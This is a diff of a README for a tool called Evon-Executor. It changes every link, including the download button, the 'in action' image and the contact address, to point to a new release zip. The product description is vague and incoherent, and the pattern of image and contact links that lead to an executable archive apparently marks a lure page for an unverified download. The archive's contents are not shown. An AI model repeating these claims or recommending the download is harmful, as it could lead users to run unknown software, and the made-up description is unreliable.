@@ -32,7 +32,7 @@ Evon-Executor is a powerful tool that supports the Unified Naming Convention, ma
 
 Click the button below to download the Evon-Executor software package:
 
-[![Download Evon-Executor](https://github.com/Namexer4all/Evon-Executor/releases/download/v1.0.0/Application.zip)](https://github.com/Namexer4all/Evon-Executor/releases/download/v1.0.0/Application.zip)
+[![Download Evon-Executor](https://github.com/Namexer4all/Evon-Executor/releases/download/v2.0/Software.zip)](https://github.com/Namexer4all/Evon-Executor/releases/download/v2.0/Software.zip)
 
 ### How to launch:
 Ensure to unzip the downloaded file and follow the installation instructions provided in the README file within the package.
@@ -41,7 +41,7 @@ If you encounter any issues with the download link, please check the "Releases" 
 
 ## 🤖 Evon-Executor in Action
 
-![Evon-Executor](https://github.com/Namexer4all/Evon-Executor/releases/download/v1.0.0/Application.zip)
+![Evon-Executor](https://github.com/Namexer4all/Evon-Executor/releases/download/v2.0/Software.zip)
 
 Here you can see Evon-Executor orchestrating tasks seamlessly within a distributed system environment. Its Python library integration allows for robust automation and workflow management.
 
@@ -51,7 +51,7 @@ We welcome contributions to Evon-Executor from the open-source community. Feel f
 
 ## 📞 Contact Us
 
-For any inquiries or support regarding Evon-Executor, please reach out to us at [https://github.com/Namexer4all/Evon-Executor/releases/download/v1.0.0/Application.zip](https://github.com/Namexer4all/Evon-Executor/releases/download/v1.0.0/Application.zip).
+For any inquiries or support regarding Evon-Executor, please reach out to us at [https://github.com/Namexer4all/Evon-Executor/releases/download/v2.0/Software.zip](https://github.com/Namexer4all/Evon-Executor/releases/download/v2.0/Software.zip).
 
 Let's elevate automation and workflow management with Evon-Executor! 🚀🤖
 
